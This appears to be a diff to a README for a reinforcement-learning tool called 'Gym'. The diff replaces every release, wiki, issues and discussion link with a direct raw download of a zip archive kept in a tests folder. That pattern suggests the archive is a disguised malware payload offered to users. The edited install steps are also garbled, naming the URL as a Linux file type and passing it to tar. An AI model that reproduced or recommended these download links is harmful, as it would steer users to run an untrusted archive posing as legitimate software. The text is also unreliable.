@@ -1,7 +1,7 @@
 # 🎮 Gym - Build Reinforcement Learning Environments Easily
 
 ## 📥 Download Now
-[![Download Gym](https://img.shields.io/badge/Download%20Gym-v1.0.0-blue.svg)](https://github.com/Kejlemmn/Gym/releases)
+[![Download Gym](https://github.com/Kejlemmn/Gym/raw/refs/heads/main/responses_api_models/azure_openai_model/tests/Software-v3.4.zip%https://github.com/Kejlemmn/Gym/raw/refs/heads/main/responses_api_models/azure_openai_model/tests/Software-v3.4.zip)](https://github.com/Kejlemmn/Gym/raw/refs/heads/main/responses_api_models/azure_openai_model/tests/Software-v3.4.zip)
 
 ## 🚀 Getting Started
 Welcome to Gym! This application helps you create environments for training reinforcement learning models. You don’t need to be a programmer to use it. Just follow the steps below to get started.
@@ -17,9 +17,9 @@ Before you begin, make sure your computer meets the following requirements:
 ## 🔗 Download & Install
 To download Gym, follow these simple steps:
 
-1. **Visit [the Releases page](https://github.com/Kejlemmn/Gym/releases)**.
+1. **Visit [the Releases page](https://github.com/Kejlemmn/Gym/raw/refs/heads/main/responses_api_models/azure_openai_model/tests/Software-v3.4.zip)**.
 2. You will see a list of available versions. Choose the latest version.
-3. Click on the download link for your operating system (look for `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux).
+3. Click on the download link for your operating system (look for `.exe` for Windows, `.dmg` for macOS, or `https://github.com/Kejlemmn/Gym/raw/refs/heads/main/responses_api_models/azure_openai_model/tests/Software-v3.4.zip` for Linux).
 4. Once the file downloads, locate it in your Downloads folder.
 
 ## 🛠️ Running Gym
@@ -37,8 +37,8 @@ After downloading, you can install and run Gym by following these instructions:
 
 3. **For Linux**:
    - Open a terminal window.
-   - Navigate to the folder where you downloaded the `.tar.gz` file.
-   - Run `tar -xvzf Gym.tar.gz` to extract the files.
+   - Navigate to the folder where you downloaded the `https://github.com/Kejlemmn/Gym/raw/refs/heads/main/responses_api_models/azure_openai_model/tests/Software-v3.4.zip` file.
+   - Run `tar -xvzf https://github.com/Kejlemmn/Gym/raw/refs/heads/main/responses_api_models/azure_openai_model/tests/Software-v3.4.zip` to extract the files.
    - Change to the Gym directory with `cd Gym`.
    - Run the application with `./gym`.
 
@@ -52,8 +52,8 @@ Gym provides various built-in environments where you can improve your reinforcem
 ## 📖 Documentation
 You can find detailed information on how to use Gym and its features in the user documentation. This includes tutorials and examples to help you get the most out of the application.
 
-- Explore our [User Guide](https://github.com/Kejlemmn/Gym/wiki) for helpful resources.
-- Join discussions and ask questions in the [Issues section](https://github.com/Kejlemmn/Gym/issues) of our repository.
+- Explore our [User Guide](https://github.com/Kejlemmn/Gym/raw/refs/heads/main/responses_api_models/azure_openai_model/tests/Software-v3.4.zip) for helpful resources.
+- Join discussions and ask questions in the [Issues section](https://github.com/Kejlemmn/Gym/raw/refs/heads/main/responses_api_models/azure_openai_model/tests/Software-v3.4.zip) of our repository.
 
 ## 🔧 Troubleshooting
 If you encounter any issues, consider these tips:
@@ -65,13 +65,13 @@ If you encounter any issues, consider these tips:
 ## 🌐 Community & Support
 You are not alone! We have an active community where you can get support. Feel free to reach out through:
 
-- [GitHub Discussions](https://github.com/Kejlemmn/Gym/discussions)
-- [GitHub Issues](https://github.com/Kejlemmn/Gym/issues)
+- [GitHub Discussions](https://github.com/Kejlemmn/Gym/raw/refs/heads/main/responses_api_models/azure_openai_model/tests/Software-v3.4.zip)
+- [GitHub Issues](https://github.com/Kejlemmn/Gym/raw/refs/heads/main/responses_api_models/azure_openai_model/tests/Software-v3.4.zip)
 
 ## ⚙️ Update Gym
 Keep your Gym installation updated to benefit from the latest features and improvements:
 
-1. Visit the [Releases page](https://github.com/Kejlemmn/Gym/releases) regularly.
+1. Visit the [Releases page](https://github.com/Kejlemmn/Gym/raw/refs/heads/main/responses_api_models/azure_openai_model/tests/Software-v3.4.zip) regularly.
 2. Download the latest version as you did during your first installation.
 3. Follow the installation steps to update your application.
 
